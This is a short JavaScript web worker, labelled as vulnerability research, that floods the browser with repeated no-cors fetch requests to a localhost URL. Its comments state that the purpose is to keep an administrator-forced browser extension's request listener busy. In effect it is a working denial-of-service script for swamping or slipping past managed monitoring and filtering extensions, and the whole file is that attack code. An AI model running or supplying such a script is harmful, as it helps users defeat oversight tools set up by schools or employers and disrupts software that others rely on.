// worker.js - Precision Vulnerability Research Script
self.onmessage = function(e) {
    if (e.data === "start") {
        // We use a small loop to ensure we aren't flooding the system bus,
        // but we keep the extension's 'onBeforeRequest' listener occupied.
        setInterval(() => {
            for (let i = 0; i < 3; i++) { 
                const testId = self.crypto.randomUUID();
                
                // We use a specific URL structure that forced-extensions 
                // often prioritize for deep-scanning.
                const testUrl = `http://127.0.0.1/research?verify=${testId}&check=true`;

                // 'keepalive: false' ensures we don't clog the browser's 
                // actual network sockets, just the extension's logic.
                fetch(testUrl, { 
                    mode: 'no-cors', 
                    cache: 'no-store',
                    keepalive: false 
                }).catch(() => {
                    // This will always fail, which is good. 
                    // It clears the memory immediately.
                });
            }
        }, 60); // 60ms allows the UI thread to breathe while keeping the extension busy.
    }
};
